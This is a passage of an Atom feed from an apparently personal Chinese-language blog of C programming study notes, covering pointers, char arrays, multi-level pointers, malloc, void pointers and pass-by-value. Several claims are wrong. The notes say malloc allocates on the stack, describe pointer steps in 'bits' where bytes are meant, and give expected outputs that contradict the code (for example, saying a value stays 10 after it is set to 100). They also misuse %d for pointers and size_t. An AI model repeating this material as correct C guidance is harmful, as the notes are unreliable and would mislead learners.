    // *++p 運算子是由右往左結合，故等同於 *(++p)
    // ++p 為 7，*++p = 取 p 值 = 7
    printf(&amp;quot;%d&#92;n&amp;quot;, *++p); // 再移動指針增加 4 bit, 並取值 p -&amp;gt; 7
    // ++*p = ++(*p) 取 *p 值並 +1(由右往左結合)
    printf(&amp;quot;%d&#92;n&amp;quot;, ++*p); // 取指針 p 的值(7)，並將該值 + 1 -&amp;gt; 8

    return  0;
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/指針的自增自減運算/" >
        </entry>
        <entry>
            <title>
                字符數組
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/字符數組/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

int main()
{
    /*
        C 語言裡面沒有 string 的型別，需要以 char array 的方式實現
        所有字符數組必須以 &#92;0 作為結尾
        且字符串末尾的 &#92;0 會佔一個 bytes，計算 length 需注意 n(字符串數量) + 1 
    */
    //字符數組必須以 &#92;0 作為結尾
    char arr[] = {&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;&#92;0&#39;};

    // 標準寫法
    char str1[] = {&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, &#39;w&#39;, &#39;&#92;0&#39;};
    
    // 簡化 
    // length = string 數量(11) + &#39;&#92;0&#39;(1) 的數量共 12 個
    char str2[12] = {&amp;quot;hello world&amp;quot;}; // 注意使用雙引號，非單引號

    // 進一步簡化
    char str3[] = {&amp;quot;hello world&amp;quot;};
    char str4[] = &amp;quot;hello world&amp;quot;;

    size_t str_size = sizeof(str4) / sizeof(char);
    printf(&amp;quot;%d&#92;n&amp;quot;, str_size); // 字符串長度 12
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250826080229.png&quot; alt=&quot;Pasted image 20250826080229.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;區分: &#39;&#92;0&#39;, 0, &#39;0&#39;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;

int main()
{
    // 區分: &#39;&#92;0&#39;, 0, &#39;0&#39;
    printf(&amp;quot;%d&#92;n&amp;quot;, &#39;&#92;0&#39; == 0); // true
    printf(&amp;quot;%d&#92;n&amp;quot;, &#39;0&#39; == &#39;&#92;0&#39;); // false
    printf(&amp;quot;%d&#92;n&amp;quot;, &#39;0&#39; == 0); // false
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;單雙引號區別&lt;br /&gt;
如果用 &amp;quot;x&amp;quot; 宣告字符串變數，C 語言就會自動補 &lt;code&gt;&#92;0&lt;/code&gt;&lt;br /&gt;
如果用 &#39;x&#39; 宣告字符串變數，C 語言不會自動補 &lt;code&gt;&#92;0&lt;/code&gt;，但用 &#39;x&#39; 宣告的字符串可以進行&lt;code&gt;ASCII&lt;/code&gt;加減法&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;

int main()
{
    char char1[] = &amp;quot;x&amp;quot;; // 常量，會自動補 &#92;0 結束符
    char char2[] = {&#39;x&#39;}; // 字符，必須手動補 &#92;0 結束符
    // &amp;quot;x&amp;quot; 與 &#39;x&#39; 字節佔用量
    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 &#92;0
    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 &#92;0
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;char 字符 ASCII 運算&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;

int main()
{
    char char1[] = &amp;quot;x&amp;quot;; // 常量，會自動補 &#92;0 結束符
    char char2[] = {&#39;x&#39;}; // 字符，必須手動補 &#92;0 結束符
    // &amp;quot;x&amp;quot; 與 &#39;x&#39; 字節佔用量
    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char1) / sizeof(char))); // 2，含結束符 &#92;0
    printf(&amp;quot;%d&#92;n&amp;quot;, (sizeof(char2) / sizeof(char))); // 1，不含結束符 &#92;0

    // %c 用於輸出一個 char 字符
    printf(&amp;quot;%c&#92;n&amp;quot;, &#39;x&#39;+1); // char 運算，+1 後會變成 y
    printf(&amp;quot;%c&#92;n&amp;quot;, 65); // 輸出 A, 因為(ASCII 65 = &#39;A&#39;)
    printf(&amp;quot;%c&#92;n&amp;quot;, &#39;A&#39;+1); // 輸出 B, 因為(ASCII 65 = &#39;A&#39;)+1 = (ASCII 66 = &#39;B&#39;)
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/字符數組/" >
        </entry>
        <entry>
            <title>
                同類指針相減運算
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/同類指針相減運算/</id>
            <content type="html">
                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818180158.png&quot; alt=&quot;Pasted image 20250818180158.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9};

    // 使用 &amp;amp; 運算符，提取 arr[0] 的地址存入指針變數 p1
    int *p1 = &amp;amp;arr[0];
    int *p2 = &amp;amp;arr[3];
    printf(&amp;quot;%d&#92;n&amp;quot;, *p1); // 1
    printf(&amp;quot;%d&#92;n&amp;quot;, *p2); // 7
    printf(&amp;quot;%d&#92;n&amp;quot;, *p2-*p1); // 用 * 運算符取 p2、p1 指針值做相減(7-1=6)
    printf(&amp;quot;%d&#92;n&amp;quot;, p1); // 指針相減 p2-p1 相差 14
    printf(&amp;quot;%d&#92;n&amp;quot;, p2); // 指針相減 p2-p1 相差 14
    printf(&amp;quot;%d&#92;n&amp;quot;, p2 - p1); // 指針相減 p2-p1 相差 12 個 byte (1807002288-1807002300 = 12)/4bit(int 長度) = 3 個元素的距離
    return  0;
}

// execute: clang PointerTest-2.3.3.c -o PointerTest-2.3.3 &amp;amp;&amp;amp; ./PointerTest-2.3.3
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;&amp;amp;&lt;/code&gt; 與 &lt;code&gt;*&lt;/code&gt; 差異&lt;br /&gt;
&lt;code&gt;&amp;amp;&lt;/code&gt; -&amp;gt; 從「變數」取址運算符&lt;br /&gt;
&lt;code&gt;*&lt;/code&gt; -&amp;gt; 從「指針」取值運算符&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818181835.png&quot; alt=&quot;Pasted image 20250818181835.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;AB 兩個選想是因為 scanf 需要以 &amp;amp; 作為賦值&lt;/p&gt;
&lt;h1 id=&quot;賦值練習題&quot; tabindex=&quot;-1&quot;&gt;賦值練習題&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818185836.png&quot; alt=&quot;Pasted image 20250818185836.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/同類指針相減運算/" >
        </entry>
        <entry>
            <title>
                二級指針(多重指針)
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/二級指針(多重指針)/</id>
            <content type="html">
                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819212809.png&quot; alt=&quot;Pasted image 20250819212809.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;例題 1:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int num = 10;
    int *p1 = &amp;amp;num; // p1 指向 num 的地址
    int *p2 = p1;   // p2 也指向 num 的地址（與 p1 相同）
    printf(&amp;quot;%p&#92;n&amp;quot;, p1); // 輸出 p1（num 的地址）
    printf(&amp;quot;%p&#92;n&amp;quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）

    // 故，p2 不是二級指針，因為他還是指向 p1 的 num 地址

    // 記憶體示意圖
    // 記憶體地址    變數      值
    // 0x1000       num      10
    // 0x2000       p1       0x1000  (num的地址)
    // 0x3000       p2       0x1000  (複製p1的值，也是num的地址)
    return 0;
}

// execute: 
//  clang PointerTest-4.c -o PointerTest-4 &amp;amp;&amp;amp; ./PointerTest-4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;例題 2:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 二重指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int num = 10;
    int *p1 = &amp;amp;num; // p1 指向 num 的地址
    int *p2 = p1;   // p2 也指向 num 的地址（與 p1 相同）
    printf(&amp;quot;%p&#92;n&amp;quot;, p1); // 輸出 p1（num 的地址）
    printf(&amp;quot;%p&#92;n&amp;quot;, p2); // 輸出 p2（num 的地址，與 p1 相同）
    *p2 = 100; // 將 p2 所在的位址的值改為 100
    printf(&amp;quot;%d&#92;n&amp;quot;, *p2); // 100
    printf(&amp;quot;num: %d&#92;n&amp;quot;, num); // 因為 p2 取的是 num 的位址，當 *p2 賦值時，其實是修改 num 所在記憶體空間的值
    return 0;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 二級指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int a = 10;
    int *p3 = &amp;amp;a;

    // 如何聲明二級指針
    // 但是此時 p4 定義的二級指針寫法錯誤
    int *p4 = &amp;amp;p3;
    printf(&amp;quot;%p&#92;n&amp;quot;, p3); // 0x16b74aadc
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p3); // 0x16b74aad0
    printf(&amp;quot;%p&#92;n&amp;quot;, p4); // 0x16b74aad0
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p4); // 0x16f05eac8(p4 的地址)

    // 正確的定義二級指針語法
    int **p5 = &amp;amp;p3;
    printf(&amp;quot;%d&#92;n&amp;quot;, *p5); // 1868049116
    printf(&amp;quot;%d&#92;n&amp;quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)

    **p5 = 100;
    printf(&amp;quot;%d&#92;n&amp;quot;, **p5); // 10(正確， **p5 = p3 指針所指向的 a 的值)
    printf(&amp;quot;%d&#92;n&amp;quot;, a); // 10(正確，**p5 = p3 指針所指向的 a 的值)
}

// execute: 
//  clang PointerTest-4.c -o PointerTest-4 &amp;amp;&amp;amp; ./PointerTest-4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;二級指針只能由指針賦值，不能直接拿地址賦值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 舉例 1:
int b = 5;
int **p1 = &amp;amp;b; // 這裡出錯，因為 b 是 int 類型，就算 &amp;amp;b 也是取 int 的地址，但 **p1 是二級指針

// 正確
int b = 5;
int *pp0 = &amp;amp;b; // 需要經過一個轉換，轉換成指針形態才能賦值給二級指針
int **p1 = &amp;amp;pp0;
printf(&amp;quot;%d&#92;n&amp;quot;, **p1); 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819225732.png&quot; alt=&quot;Pasted image 20250819225732.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;多級指針解引用&quot; tabindex=&quot;-1&quot;&gt;多級指針解引用&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819230308.png&quot; alt=&quot;Pasted image 20250819230308.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 二級指針 -&amp;gt; 多級指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int var = 5;
    int *ptr = &amp;amp;var;
    printf(&amp;quot;%d&#92;n&amp;quot;, *ptr);
    int **pptr = &amp;amp;ptr; // 二級指針
    printf(&amp;quot;%d&#92;n&amp;quot;, **pptr);
    int ***ppptr = &amp;amp;pptr; // 三級指針
    printf(&amp;quot;%d&#92;n&amp;quot;, ***ppptr); // 三級指針解引用

    ***ppptr = 100; // 其實修改的是 var 的變數值
    // 所有引用這個地址的值都被修改了
    printf(&amp;quot;%d&#92;n&amp;quot;, *ptr); 
    printf(&amp;quot;%d&#92;n&amp;quot;, **pptr);
    printf(&amp;quot;%d&#92;n&amp;quot;, ***ppptr);
    
}

// execute: 
//  clang PointerTest-4.c -o PointerTest-4 &amp;amp;&amp;amp; ./PointerTest-4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819231450.png&quot; alt=&quot;Pasted image 20250819231450.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/二級指針(多重指針)/" >
        </entry>
        <entry>
            <title>
                malloc 內存分配
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配/</id>
            <content type="html">
                &lt;p&gt;malloc&lt;br /&gt;
函數原型&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void *malloc(unsigned int size); // size 類型為無符號整型
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;無符號整型 = 0 or 正整數&lt;/p&gt;
&lt;p&gt;因為少了負數，可以將所有位元用於顯示正整數&lt;/p&gt;
&lt;p&gt;malloc 函數返回的是一個指針，所以他是一個指針函數&lt;/p&gt;
&lt;p&gt;作用: 在內存的動態儲存區(stack 區) 中分配一個長度為 size 的連續空間，並將該空間的首地址做為函數值返回，即此函數為&lt;mark&gt;指針函數&lt;/mark&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配/" >
        </entry>
        <entry>
            <title>
                malloc 內存分配 - void 指針
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配 - void 指針/</id>
            <content type="html">
                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250830184511.png&quot; alt=&quot;Pasted image 20250830184511.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250830190855.png&quot; alt=&quot;Pasted image 20250830190855.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdlib.h&amp;gt;

// 無類型指針

// 結構體指針
int main()
{
    int x = 10;
    int *p = &amp;amp;x;
    printf(&amp;quot;%d&#92;n&amp;quot;, *p);

    
    // 無類型的指針變數可以與其他類型的指針相賦值
    void *q = &amp;amp;x; // 無類型指針
    q = p;
    int *r = q;
    double *s = q;
    
    // int y = *q; // 無法解讀 void 指針類型的數據
    int y = *((int *)q); // 強制轉型
    printf(&amp;quot;%d&#92;n&amp;quot;, *r);
    printf(&amp;quot;%d&#92;n&amp;quot;, y);
    printf(&amp;quot;%f&#92;n&amp;quot;, *s); // 不要嘗試讀取其他類型的指針，會導致不可預期的行為
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/malloc 內存分配 - void 指針/" >
        </entry>
        <entry>
            <title>
                C 語言 pass by value
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/C 語言 pass by value/</id>
            <content type="html">
                &lt;p&gt;C 語言沒有 pass by reference, 只有 pass by value，這是語言特性&lt;/p&gt;
&lt;p&gt;就算是 pointer 也是 pass by value&lt;/p&gt;
&lt;p&gt;若要實現 pass by reference, 需借助指針的功能&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdlib.h&amp;gt;

void setNum(int *p)
{
    *p = 10; // 解引用後修改其值
}
int main()
{
    int a=100;
    printf(&amp;quot;a: %d&#92;n&amp;quot;, a); // 100
    setNum(&amp;amp;a); // 將 a 的地址傳進 function
    printf(&amp;quot;a: %d&#92;n&amp;quot;, a); // 10
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/C 語言 pass by value/" >
        </entry>
</feed>
